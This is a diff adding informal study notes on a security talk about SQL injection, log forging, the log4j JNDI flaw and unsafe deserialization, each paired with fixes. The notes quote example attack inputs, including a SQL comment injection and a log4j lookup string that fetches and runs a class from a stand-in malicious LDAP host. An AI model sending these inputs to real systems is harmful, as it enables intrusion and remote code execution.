@@ -1,0 +1,38 @@
+Top Security Flaws Hiding in Your Code Right Now – and How to Fix Them
+- video - https://www.youtube.com/watch?v=Gcqg1CkiFIM
+
+- Fortnite in 2019 as example for exploits
+- promo for SonarCube (where he works)
+   - static analysis for 'clean code' and basic fuck-ups
+   - can trigger false positives - better to double-check
+   
+- still many projects that download vulnerable version of log4j (5M in 1 week in May 2025!?)
+- injection - goals - bypass validation / remote execution
+            - SQL - primitive example with username admin'--
+                  - to comment the rest of where condition :/
+                     -> use parameters
+            - Logging - A) 'forging the logs', e.g. not sanitizing user input - user adds many lines like 'user: user1 logged\n2025-01-01 INFO: admin was logged/n2025-01-01 INFO: admin deleted user1/n'
+                            - creates 'hallucination' in logs to mess with poor dev to find what is going on
+                            - simple sanitize the input - e.g. replace new lines, end of rows with visible characters like "xxx--- they mess with you ---xxx" 
+                            
+                      - B) tries to trigger remote execution
+                            - log4j tried to lookup objects in JNDI remotely and execute them (e.g. formatter from OS, but could enforce remote url) o_O
+                            - example ${jndi:ldap://malicious.server.com/malware/Exploit.class} 
+                               - log4j would read and try to interpolate the string
+                               - it thinks it needs perform the lookup on the url
+                               - it download exploit class 
+                               - it instantiate exploit class
+                               - it executes the code from the class
+                               => 1) Global solution: disable lookups for all: -Dlog4j2.formatMsgNoLookups=true
+                                  2) Use something else ~ Quarkus
+                                  3) Create whitelist of urls from where you allow lookup - like defined in my package only
+                                      - via JVM param -Djava.naming.factory.initial=org.your.package.YourAppFactory - holds the whitelist or URLs
+                                  4) Use newer version of log4j     
+                                      - note - maintained by 1 guy while all corporation exploit his work for free... 
+                             - even though logging in will fail with the username, the remote code is executed :( and it is too late          
+                                      
+            - Deserialization - casting objects that can perform something on constructor, e.g. deleting files
+                              - if we do not check/sanitize that we cast to the correct/expected class - boom
+                              - always validate the serialized class against the one we want to deserialize (~marshal) into
+                                - example checks class name - a bit lame - maybe use serialization UUID?
+
